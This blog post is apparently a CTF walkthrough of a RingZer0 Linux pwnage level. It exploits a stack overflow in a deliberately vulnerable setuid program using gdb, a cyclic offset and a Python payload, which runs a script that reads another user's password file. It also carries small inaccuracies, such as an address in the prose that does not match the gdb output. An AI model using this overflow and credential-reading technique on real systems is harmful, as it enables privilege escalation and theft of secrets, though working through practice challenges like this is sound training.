---                                                                                                                                                                                                                
title: "R0 | Pwnage Linux - Level2"
layout: post
date: 2019-08-14
tag:
- Pwnage
- x86 
- Linux
- walktrhough
- CTF 
category: blog
author: Srbx7
description: R0 | Pwnage Linux - Level2
---

`# file level2`

```
level2: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=c7cadd40f2b214c91e5aa77e76b403e7201db8f9, with debug_info, not stripped
```

> Has a setuid

> Is an ELF 32-bit LSB exec

> Is compile for Intel X86 processors

`# checksec level2` 

```
[*] '/root/ringzer0team/pwnageLinux/level2/level2'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

> Simply go a head and smash the stack! ;)

`# cat level2`

```c
// Created by Hidden (hidden@undernet.org)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct USER {
    int id;
    char name[32];
    char pass[32];
} u = { 0, "nobody", "Ksdkjkk32avsh" };



int main(int argc, char **argv)
{
    char user[32];
    char pass[32];
    char command[64];
    char *shell[] = { command, 0 };
    char *p;

    printf("Username: ");
    fgets(user, 31, stdin);
    p = strchr(user, '\n');
    if (p)
        *p = '\0';

	// strcmp('foo', 'foo') --> 0 
	// strcmp('foo', 'bar') --> 1
    if (strcmp(user, u.name))
        return 0;
    printf("Password: ");
    fgets(pass, 31, stdin);
    p = strchr(pass, '\n');
    if (p)
        *p = '\0';
    if (strcmp(pass, u.pass))
        return 0;
    printf("Command: ");

	// fgets is a well known vulnerable function to overflow
    if (fgets(command, 128, stdin) == NULL) 
        return 0;
    p = strchr(command, '\n');
    if (p)
        *p = '\0';
    if (!strcmp(user, "root")) {
        printf("Good job!\n");
        printf("command: %s\n", command);
        setresuid(geteuid(), geteuid(), geteuid());
        execve(shell[0],shell,0);
    }
    else {
        printf("Okay Mr. %s. Dropping priviledges though.\n", user);
        setreuid(getuid(), getuid());
        execve(shell[0],shell,0);
    }
    return 0;
} 
```

>  the first user input has to be `nobody`

>  the second user input has to be `Ksdkjkk32avsh`

>  then the first user input has to be `root`

Meh, it doesn't seem that hard...... Let's try to provide this prgoram with everything it needs for the first two user inputs. Then just overflow the third one to overwrite the user variable with `root`. To do this, it is necessary to determine the memory address of the `user` variable.

By using `gdb`, it is possible to see that this address is: `0xffa3de8c`

```bash
(gdb) 
Username: nobody
26		p = strchr(user, '\n');
(gdb) x $esp
0xffffdbf0:	0xffffdc6c
(gdb) x 0xffffdc6c
0xffffdc6c:	0x6f626f6e
(gdb) x/100wx 0xffffdc6c
0xffffdc6c:	0x6f626f6e	0x000a7964	0xffffdd34	0xffffdd3c
```

```python
from pwn import *
print '6f626f6e'.decode('hex') # 'obon'
print '000a7964'.decode('hex') #'\x00\nyd'
print cyclic(1000)
```

```bash
(gdb) 
Command: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
41		p = strchr(command, '\n');
(gdb) x 0xffffdc6c
0xffffdc6c:	0x61616179
```

```python
cyclic_find(0x61616179)
96
```

`cat /tmp/srbx7.sh`

```bash
#!/bin/bash
whoami
cat /home/level3/.pass
```

```bash
level2@lxc-pwn-x86:/levels$ chmod +x /tmp/srbx7.sh
level2@lxc-pwn-x86:/levels$ python -c 'print "nobody\nKsdkjkk32avsh\n" + "/tmp/srbx7.sh\x00" + "\x90" * (96-len("/tmp/srbx7.sh0")) + "root\x00"'| ./level2 
Username: Password: Command: Good job!
level3
bXXXXXXXXXXXXXXXXXXD
```
